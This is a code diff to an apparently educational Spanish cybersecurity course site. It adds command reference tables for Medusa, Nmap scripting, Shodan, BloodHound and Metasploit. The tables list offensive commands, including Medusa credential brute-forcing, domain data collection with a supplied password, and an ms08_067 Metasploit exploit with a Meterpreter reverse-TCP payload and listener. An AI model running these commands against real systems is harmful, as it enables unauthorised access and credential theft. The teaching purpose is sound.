@@ -28,12 +28,16 @@ import {
 
 const modules = [
   { id: 'overview', label: 'Ruta de aprendizaje', icon: BookOpen, tag: 'Inicio' },
-  { id: 'nmap', label: 'Nmap y Zenmap', icon: Radar, tag: '01' },
-  { id: 'wifi', label: 'Wi‑Fi y Aircrack-ng', icon: Wifi, tag: '02' },
-  { id: 'sqli', label: 'SQL Injection', icon: KeyRound, tag: '03' },
-  { id: 'traffic', label: 'Wireshark / TShark', icon: Activity, tag: '04' },
-  { id: 'directory', label: 'BloodHound y AD', icon: Network, tag: '05' },
-  { id: 'metasploit', label: 'Metasploit', icon: ShieldCheck, tag: '06' },
+  { id: 'medusa', label: 'Medusa', icon: KeyRound, tag: '01' },
+  { id: 'nmap', label: 'Nmap y Zenmap', icon: Radar, tag: '02' },
+  { id: 'nse', label: 'Nmap Scripting Engine', icon: FileCode2, tag: '03' },
+  { id: 'wifi', label: 'Wi‑Fi y Aircrack-ng', icon: Wifi, tag: '04' },
+  { id: 'sqli', label: 'SQL Injection', icon: LockKeyhole, tag: '05' },
+  { id: 'traffic', label: 'Wireshark / TShark', icon: Activity, tag: '06' },
+  { id: 'directory', label: 'BloodHound y AD', icon: Network, tag: '07' },
+  { id: 'shodan', label: 'Shodan', icon: Globe2, tag: '08' },
+  { id: 'metasploit', label: 'Metasploit', icon: ShieldCheck, tag: '09' },
+  { id: 'flow', label: 'Flujo de pentest', icon: CheckCircle2, tag: '10' },
 ]
 
 const toolCards = [
@@ -44,9 +48,29 @@ const toolCards = [
 ]
 
 const commands = {
-  nmap: ['nmap -sn {objetivo}', 'nmap -sV -p {puertos} {objetivo}', 'nmap -oA informe {objetivo}'],
+  nmap: ['nmap -sn {objetivo}', 'nmap -Pn {objetivo}', 'nmap -PR {objetivo}', 'sudo nmap -sS {objetivo}', 'nmap -sT {objetivo}', 'sudo nmap -sU {objetivo}', 'nmap -sN {objetivo}', 'nmap -sF {objetivo}', 'nmap -sX {objetivo}', 'nmap -p {puertos} {objetivo}', 'nmap -p- {objetivo}', 'nmap --top-ports 100 {objetivo}', 'nmap -sV {objetivo}', 'sudo nmap -O {objetivo}', 'sudo nmap -A {objetivo}', 'nmap -sC {objetivo}', 'nmap --script vuln {objetivo}', 'nmap --script smb-vuln-ms17-010 -p445 {objetivo}', 'nmap --script ftp-anon -p21 {objetivo}', 'nmap -oA informe {objetivo}', 'nmap -T4 {objetivo}'],
   wifi: ['airmon-ng start {interfaz}', 'airodump-ng {interfaz_monitor}', 'wireshark {captura}.cap'],
-  traffic: ['tshark -D', 'tshark -r {captura}.pcapng -Y "{filtro}"', 'dumpcap -c {paquetes} -w captura.pcapng'],
+  traffic: ['tshark -D', 'tshark -r {captura}.pcapng -Y "{filtro}"', 'tshark -i3 -w captura.pcapng', 'tshark -i3 -a files:6 -b duration:30 -w cap.pcapng', 'tshark -qz io,phs', 'tshark -qz hosts', 'tshark -qz expert,warns', 'dumpcap -D', 'dumpcap -c {paquetes} -w captura.pcapng'],
+}
+
+const commandSections: Record<string, [string, string][]> = {
+  medusa: [
+    ['medusa', 'Muestra opciones disponibles'], ['medusa -d', 'Lista módulos soportados'], ['medusa -h {IP} -u {user} -P pass.txt -M ftp', 'Prueba contraseñas en un laboratorio'], ['medusa -h {IP} -U users.txt -p {pass} -M ftp', 'Prueba usuarios conocidos'], ['medusa -h {IP} -U users.txt -P pass.txt -M ftp', 'Auditoría completa de credenciales'], ['medusa -H hosts.txt -U users.txt -P pass.txt -M ftp', 'Trabaja con múltiples hosts'], ['medusa ... -T 2', 'Controla hosts en paralelo'], ['medusa ... -M ssh -n 2222', 'Usa un puerto no estándar'], ['medusa ... -e ns', 'Prueba credenciales vacías o iguales al usuario'], ['medusa ... -O log.txt', 'Guarda resultados'], ['medusa ... -f / -F', 'Detiene al encontrar un login válido'], ['medusa ... -v 6', 'Activa salida detallada'], ['medusa -M ftp -C userpass.txt', 'Usa un archivo combo'], ['medusa ... -t 4', 'Cuatro logins simultáneos por host'], ['medusa ... -q', 'Muestra información del módulo'],
+  ],
+  nse: [
+    ['nmap --script http-title {target}', 'Ejecuta un script NSE'], ['nmap --script http-title,http-methods {target}', 'Ejecuta varios scripts'], ['nmap --script "http-* and not(exploit)" {target}', 'Selecciona scripts con expresiones'], ['nmap --script "not(intrusive or dos or exploit)" -sV {target}', 'Excluye categorías peligrosas'], ['nmap --script brute --script-args userdb=users.txt', 'Pasa argumentos'], ['nmap --script brute --script-args brute.firstOnly', 'Se detiene ante el primer resultado'], ['nmap --script vuln --script-args unsafe -p- -sV {target}', 'Pruebas inseguras, solo en laboratorio'], ['nmap -sC -F {target}', 'Scripts predeterminados'], ['nmap --script /ruta/a/script.nse {target}', 'Ejecuta un script propio'], ['nmap --script broadcast-ping --script-args newtargets', 'Descubrimiento por broadcast'], ['nmap -d3 --script mybuggyscript {target}', 'Depura un script'], ['nmap --script-trace --script exploit {target}', 'Traza comunicaciones'],
+  ],
+  shodan: [
+    ['pip install shodan', 'Instala el cliente CLI'], ['shodan init {API_KEY}', 'Configura la API'], ['shodan info', 'Muestra créditos disponibles'], ['shodan count openssh', 'Cuenta resultados'], ['shodan host {IP}', 'Consulta una IP'], ['shodan myip', 'Muestra la IP pública'], ["shodan search 'product:MySQL'", 'Busca por producto'], ['shodan search --fields ip_str,port,org product:mongodb', 'Filtra campos'], ["shodan download resultados 'query'", 'Descarga resultados'], ['shodan parse --fields ip_str,port -f port:2222 archivo.json.gz', 'Filtra resultados descargados'], ['shodan stats --facets country,port nginx', 'Obtiene estadísticas'], ['shodan scan submit {IP}', 'Solicita un escaneo autorizado'], ['shodan scan status {scan_id}', 'Consulta estado'],
+  ],
+  bloodhound: [['apt install bloodhound', 'Instala la interfaz'], ['neo4j console', 'Levanta Neo4j'], ['bloodhound', 'Abre la GUI'], ['pip3 install bloodhound', 'Instala el ingestor Python'], ['bloodhound-python -u administrator -p {pass} -ns {IP_DC} -d dominio.local -c All', 'Extrae datos del dominio'], ['SharpHound.exe', 'Ingestor para Windows'], ['Invoke-BloodHound -CollectionMethod All', 'Recolecta datos con PowerShell']],
+  metasploit: [['search ms08_067', 'Busca un módulo'], ['use windows/smb/ms08_067_netapi', 'Selecciona un módulo'], ['show options', 'Muestra parámetros'], ['set RHOST {IP}', 'Define objetivo'], ['set RHOSTS {rango}', 'Define un rango'], ['set LHOST {IP}', 'Define IP local'], ['set PAYLOAD windows/meterpreter/reverse_tcp', 'Selecciona payload'], ['show payloads', 'Lista payloads'], ['exploit', 'Ejecuta el módulo en una VM'], ['exploit -j', 'Ejecuta como job'], ['db_import escaneo.xml', 'Importa Nmap'], ['db_hosts / db_services', 'Consulta la base de datos'], ['run', 'Ejecuta auxiliares'], ['use auxiliary/scanner/ftp/ftp_version', 'Reconoce FTP'], ['use multi/handler', 'Configura listener'], ['resource autoexploit.rc', 'Automatiza con recursos'], ['getuid', 'Muestra usuario actual'], ['ps', 'Lista procesos'], ['shell', 'Abre shell nativa'], ['background', 'Envía sesión a segundo plano'], ['run checkvm', 'Detecta virtualización'], ['msfvenom --payload {payload} ...', 'Genera payloads para laboratorio'], ['pattern_create.rb {bytes}', 'Genera patrones'], ['pattern_offset.rb {patrón}', 'Calcula offsets']],
+}
+
+function CommandTable({ id }: { id: string }) {
+  const rows = commandSections[id]
+  if (!rows) return null
+  return <div className="mt-8 rounded-2xl border border-white/10 bg-slate-950/60 p-5"><div className="mb-4 flex items-center gap-3"><Terminal className="size-5 text-cyan-300" /><div><h3 className="font-semibold text-white">Catálogo completo de comandos</h3><p className="text-xs text-slate-500">Referencia educativa para entornos autorizados</p></div></div><div className="overflow-x-auto"><table className="w-full text-left text-sm"><thead><tr className="border-b border-white/10 text-xs uppercase tracking-wider text-slate-500"><th className="px-3 py-3">Comando</th><th className="px-3 py-3">Uso</th></tr></thead><tbody>{rows.map(([command, use]) => <tr key={command} className="border-b border-white/5"><td className="px-3 py-3 font-mono text-cyan-100">{command}</td><td className="px-3 py-3 text-slate-400">{use}</td></tr>)}</tbody></table></div></div>
 }
 
 function SectionTitle({ eyebrow, title, description }: { eyebrow: string; title: string; description: string }) {
@@ -107,7 +131,7 @@ function Lab({ type }: { type: 'nmap' | 'wifi' | 'traffic' }) {
 function Overview({ onOpen }: { onOpen: (id: string) => void }) {
   return <>
     <SectionTitle eyebrow="CYBERLAB · AULA VIRTUAL" title="Aprende a investigar. Practica con criterio." description="Un espacio de aprendizaje segmentado para comprender reconocimiento, redes, vulnerabilidades y defensa. Personaliza cada laboratorio con tus propios datos, sin salir del entorno seguro." />
-    <div className="grid gap-4 md:grid-cols-3"><div className="metric-card"><span>06</span><p>Módulos prácticos</p></div><div className="metric-card"><span>04</span><p>Laboratorios guiados</p></div><div className="metric-card"><span>100%</span><p>Enfoque defensivo</p></div></div>
+    <div className="grid gap-4 md:grid-cols-3"><div className="metric-card"><span>10</span><p>Módulos prácticos</p></div><div className="metric-card"><span>70+</span><p>Comandos documentados</p></div><div className="metric-card"><span>100%</span><p>Enfoque defensivo</p></div></div>
     <div className="mt-10 flex items-center justify-between"><div><p className="eyebrow">Explorar contenido</p><h2 className="mt-2 text-2xl font-semibold text-white">Herramientas esenciales</h2></div><span className="hidden text-sm text-slate-500 md:block">Selecciona un módulo para comenzar</span></div>
     <div className="mt-5 grid gap-4 md:grid-cols-2">{toolCards.map((card) => { const Icon = card.icon; return <button key={card.title} className="tool-card text-left" onClick={() => onOpen(card.module)}><div className={`tool-icon ${card.color}`}><Icon /></div><div className="flex-1"><div className="flex items-start justify-between gap-3"><h3 className="font-semibold text-white">{card.title}</h3><ArrowRight className="size-4 text-slate-600" /></div><p className="mt-2 text-sm leading-6 text-slate-400">{card.text}</p></div></button> })}</div>
     <div className="mt-8 rounded-2xl border border-cyan-400/20 bg-gradient-to-r from-cyan-400/10 to-transparent p-6"><div className="flex items-start gap-4"><ShieldCheck className="mt-1 size-6 text-cyan-300" /><div><h3 className="font-semibold text-white">Regla de oro del aula</h3><p className="mt-1 text-sm leading-6 text-slate-400">Toda práctica debe tener alcance definido, autorización y un objetivo documentado. La ciberseguridad profesional empieza antes del primer comando.</p></div></div></div>
@@ -116,18 +140,25 @@ function Overview({ onOpen }: { onOpen: (id: string) => void }) {
 
 function ModulePage({ id }: { id: string }) {
   const data: Record<string, { eyebrow: string; title: string; description: string }> = {
-    nmap: { eyebrow: 'MÓDULO 01 · RECONOCIMIENTO', title: 'Nmap y Zenmap', description: 'Aprende a identificar hosts, puertos y servicios en una red de laboratorio. Comienza por descubrimiento, continúa con versiones y termina documentando hallazgos.' },
-    wifi: { eyebrow: 'MÓDULO 02 · SEGURIDAD INALÁMBRICA', title: 'Wi‑Fi y Aircrack-ng', description: 'Comprende el modelo de seguridad 802.11, el handshake de cuatro vías y las diferencias entre WEP, WPA2 y WPA3. Trabaja únicamente con tu propio AP.' },
-    sqli: { eyebrow: 'MÓDULO 03 · SEGURIDAD WEB', title: 'SQL Injection y autenticación', description: 'Analiza cómo una consulta construida con concatenación puede alterar la lógica de autenticación y cómo prevenirlo con consultas parametrizadas y controles de servidor.' },
-    traffic: { eyebrow: 'MÓDULO 04 · ANÁLISIS FORENSE', title: 'Wireshark y TShark', description: 'Convierte una captura en evidencia: aprende filtros de visualización, jerarquía de protocolos y señales que merecen investigación.' },
-    directory: { eyebrow: 'MÓDULO 05 · IDENTIDAD', title: 'BloodHound y Active Directory', description: 'Mapea relaciones de privilegio en un dominio de práctica para detectar rutas de escalada y oportunidades de hardening.' },
-    metasploit: { eyebrow: 'MÓDULO 06 · VALIDACIÓN', title: 'Metasploit con responsabilidad', description: 'Conoce la estructura del framework, sus módulos y la documentación de evidencias. Las pruebas de explotación se reservan para máquinas intencionalmente vulnerables.' },
+    medusa: { eyebrow: 'MÓDULO 01 · AUDITORÍA DE CREDENCIALES', title: 'Medusa', description: 'Estudia auditorías de autenticación contra servicios remotos en máquinas de práctica. Usa listas pequeñas, límites claros y evidencia documentada.' },
+    nmap: { eyebrow: 'MÓDULO 02 · RECONOCIMIENTO', title: 'Nmap y Zenmap', description: 'Aprende a identificar hosts, puertos y servicios en una red de laboratorio. Comienza por descubrimiento, continúa con versiones y termina documentando hallazgos.' },
+    nse: { eyebrow: 'MÓDULO 03 · AUTOMATIZACIÓN', title: 'Nmap Scripting Engine', description: 'Explora scripts NSE, categorías, argumentos y depuración para ampliar el reconocimiento sin perder control sobre el alcance.' },
+    wifi: { eyebrow: 'MÓDULO 04 · SEGURIDAD INALÁMBRICA', title: 'Wi‑Fi y Aircrack-ng', description: 'Comprende el modelo de seguridad 802.11, el handshake de cuatro vías y las diferencias entre WEP, WPA2 y WPA3. Trabaja únicamente con tu propio AP.' },
+    sqli: { eyebrow: 'MÓDULO 05 · SEGURIDAD WEB', title: 'SQL Injection y autenticación', description: 'Analiza cómo una consulta construida con concatenación puede alterar la lógica de autenticación y cómo prevenirlo con consultas parametrizadas y controles de servidor.' },
+    traffic: { eyebrow: 'MÓDULO 06 · ANÁLISIS FORENSE', title: 'Wireshark y TShark', description: 'Convierte una captura en evidencia: aprende filtros de visualización, jerarquía de protocolos y señales que merecen investigación.' },
+    directory: { eyebrow: 'MÓDULO 07 · IDENTIDAD', title: 'BloodHound y Active Directory', description: 'Mapea relaciones de privilegio en un dominio de práctica para detectar rutas de escalada y oportunidades de hardening.' },
+    shodan: { eyebrow: 'MÓDULO 08 · OSINT', title: 'Shodan', description: 'Practica reconocimiento pasivo sobre información indexada y aprende a interpretar banners sin escanear infraestructura ajena.' },
+    metasploit: { eyebrow: 'MÓDULO 09 · VALIDACIÓN', title: 'Metasploit con responsabilidad', description: 'Conoce la estructura del framework, sus módulos y la documentación de evidencias. Las pruebas de explotación se reservan para máquinas intencionalmente vulnerables.' },
+    flow: { eyebrow: 'MÓDULO 10 · METODOLOGÍA', title: 'Flujo general de un pentest', description: 'Conecta reconocimiento, análisis, validación y reporte en una metodología repetible para laboratorios escolares.' },
   }
   const item = data[id] ?? data.nmap
   return <><SectionTitle eyebrow={item.eyebrow} title={item.title} description={item.description} />
     {id === 'nmap' && <Lab type="nmap" />}{id === 'wifi' && <Lab type="wifi" />}{id === 'traffic' && <Lab type="traffic" />}
     {id === 'sqli' && <SqlLab />}
-    {['directory', 'metasploit'].includes(id) && <div className="grid gap-4 md:grid-cols-2"><div className="info-block"><Globe2 className="size-5 text-cyan-300" /><h3>Objetivo de la lección</h3><p>Relaciona conceptos, evidencia y controles defensivos en un entorno preparado para clases.</p></div><div className="info-block"><FileCode2 className="size-5 text-cyan-300" /><h3>Entrega sugerida</h3><p>Un informe breve con alcance, método, hallazgos, impacto y recomendación de mitigación.</p></div></div>}
+    {id === 'directory' && <CommandTable id="bloodhound" />}
+    {['medusa', 'nse', 'shodan', 'metasploit'].includes(id) && <CommandTable id={id} />}
+    {id === 'flow' && <div className="info-block mt-8"><h3>Ruta recomendada</h3><p>Shodan para reconocimiento pasivo; Nmap, NSE y Zenmap para superficie de ataque; Wireshark/TShark para observar; Medusa para auditoría autorizada; Metasploit para validar en VMs; BloodHound para analizar privilegios.</p></div>}
+    {['directory', 'metasploit', 'flow'].includes(id) && <div className="grid gap-4 md:grid-cols-2"><div className="info-block"><Globe2 className="size-5 text-cyan-300" /><h3>Objetivo de la lección</h3><p>Relaciona conceptos, evidencia y controles defensivos en un entorno preparado para clases.</p></div><div className="info-block"><FileCode2 className="size-5 text-cyan-300" /><h3>Entrega sugerida</h3><p>Un informe breve con alcance, método, hallazgos, impacto y recomendación de mitigación.</p></div></div>}
     <div className="mt-8 grid gap-4 md:grid-cols-3"><div className="lesson-step"><span>01</span><p>Fundamentos</p><small>Conceptos y vocabulario</small></div><div className="lesson-step"><span>02</span><p>Práctica</p><small>Datos propios del estudiante</small></div><div className="lesson-step"><span>03</span><p>Informe</p><small>Conclusiones y defensa</small></div></div>
   </>
 }
